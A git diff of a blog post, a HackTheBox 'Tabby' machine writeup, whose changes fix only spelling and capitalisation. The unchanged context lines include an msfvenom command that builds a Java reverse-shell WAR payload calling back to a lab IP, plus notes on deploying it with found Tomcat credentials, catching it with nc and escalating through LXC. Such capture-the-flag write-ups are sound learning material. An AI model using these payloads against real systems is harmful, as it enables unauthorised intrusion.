@@ -3,10 +3,10 @@ layout: post
 title:  "HTB Tabby writeup"
 date:   2020-12-08 18:00:00 +0300
 categories: HTB_writeup
-summary: This is my first attempt at making a writeup for a Hackthebox machine. It contains my notes on how I obtained both the user and root flag on the Tabby machine.  
+summary: This is my first attempt at making a writeup for a HackTheBox machine. It contains my notes on how I obtained both the user and root flag on the Tabby machine.  
 ---
 
-This is my first attempt at making a writeup for a Hackthebox machine. It contains my notes on how I obtained both the user and root flag on the Tabby machine.  
+This is my first attempt at making a writeup for a HackTheBox machine. It contains my notes on how I obtained both the user and root flag on the Tabby machine.  
 
 ![Tabby info card]({{site.baseurl}}/assets/img/HTB/tabby/info_card.png){: .center-image}
 [Tabby](https://www.hackthebox.eu/home/machines/profile/259) is a Linux machine released on 2020-06-20 and its difficulty level was <b>easy</b>.
@@ -58,7 +58,7 @@ The one that worked was /usr/share/tomcat9/etc/tomcat-users.xml. We can now see 
 When we try to use the newly found credentials in the manager web UI, the login fails. This is probably because tomcat does not have the manager-gui role. 
 To get around this, we'll upload our payload using the deploy endpoint & cURL.  
 First, we'll create a payload (a reverse shell) using msfvenom. Then, we'll upload it to the server using the tomcat account.
-And after that we'll open a listener using nc and go to the URL coresponding to our payload in a browser in order to run it.  
+And after that we'll open a listener using nc and go to the URL corresponding to our payload in a browser in order to run it.  
 
 {%highlight bash%}
 msfvenom -p java/shell_reverse_tcp lhost=10.10.14.62 lport=1337 -f war -o n00b.war
@@ -104,8 +104,8 @@ Now that we have access to the ash user's account we should try to gain root-lev
 Among the first things that we check is the list of groups that a user belongs to. The group that grabs our attention for this user is <b>lxc</b>.
 ![Groups]({{site.baseurl}}/assets/img/HTB/tabby/groups.png){: .center-image}
 
-Lxc is a technology used to run containers on a linux system. The level of access needed for that might be useful for escalating privileges.  
-We start looking around on the Internet for more information on LXC and possible methods of exploitinig it in order to gain more access.  
+Lxc is a technology used to run containers on a Linux system. The level of access needed for that might be useful for escalating privileges.  
+We start looking around on the Internet for more information on LXC and possible methods of exploiting it in order to gain more access.  
 We find a [blogpost](https://www.hackingarticles.in/lxd-privilege-escalation/) detailing how to use lxc or lxd in order to get root-level access.
 
 First, we clone the alpine-builder [repository](https://github.com/saghul/lxd-alpine-builder) from GitHub and run <b>build-alpine</b>.  
